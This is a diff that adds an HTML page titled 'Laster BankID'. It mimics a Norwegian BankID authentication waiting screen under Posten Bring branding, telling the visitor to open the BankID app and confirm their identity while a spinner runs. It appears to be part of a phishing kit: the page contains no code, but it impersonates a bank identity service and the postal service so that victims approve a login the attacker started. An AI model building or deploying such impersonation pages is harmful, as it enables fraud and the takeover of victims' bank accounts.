@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="no">
+<head>
+  <meta charset="UTF-8" />
+      <link rel="icon" href="./X9/icon.jpeg" type="icon.jpeg"> 
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Laster BankID</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #e6f0fa;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    .bankid-container {
+      width: 90%;
+      max-width: 400px;
+      margin: auto;
+      padding: 2em;
+      background: #d0e3f6;
+      text-align: center;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      margin-top: 2em;
+    }
+
+    .bankid-logo img {
+      width: 100px;
+      margin-bottom: 1em;
+    }
+
+    .instruction {
+      font-size: 1em;
+      color: #1c2f5c;
+      margin-bottom: 1em;
+      font-weight: bold;
+    }
+
+    .small-text {
+      font-size: 0.9em;
+      color: #1c2f5c;
+      margin-bottom: 2em;
+    }
+
+    .spinner {
+      width: 40px;
+      height: 40px;
+      border: 5px solid #c0d3eb;
+      border-top: 5px solid #3a87c9;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 1em;
+    }
+
+    .loading-text {
+      font-size: 0.95em;
+      color: #1c2f5c;
+    }
+
+    footer {
+      margin-top: auto;
+      background: #4b0c0c;
+      color: white;
+      text-align: center;
+      padding: 1em;
+    }
+
+    footer img {
+      height: 20px;
+      margin-bottom: 0.5em;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    /* Media Queries for Better Responsiveness */
+    @media (max-width: 500px) {
+      .bankid-container {
+        padding: 1.5em;
+      }
+
+      .bankid-logo img {
+        width: 80px;
+      }
+
+      .spinner {
+        width: 30px;
+        height: 30px;
+        border-width: 4px;
+      }
+
+      .instruction,
+      .small-text,
+      .loading-text {
+        font-size: 0.95em;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="bankid-container">
+    <div class="bankid-logo">
+      <img src="./X9/A.png" alt="BankID logo">
+    </div>
+
+    <div class="instruction">
+      gå til bankid-appen din og bekreft at det er deg
+    </div>
+    <div class="small-text">
+      noen ganger tar det tid å motta varselet
+    </div>
+
+    <div class="spinner"></div>
+
+    <div class="loading-text">
+      <strong>Laster BankID, vennligst vent.</strong><br>
+      Loading BankID, please wait.
+    </div>
+  </div>
+
+  <footer>
+    <img src="./X9/A.png" alt="Posten">
+    <br>© Posten Bring
+  </footer>
+
+</body>
+</html>
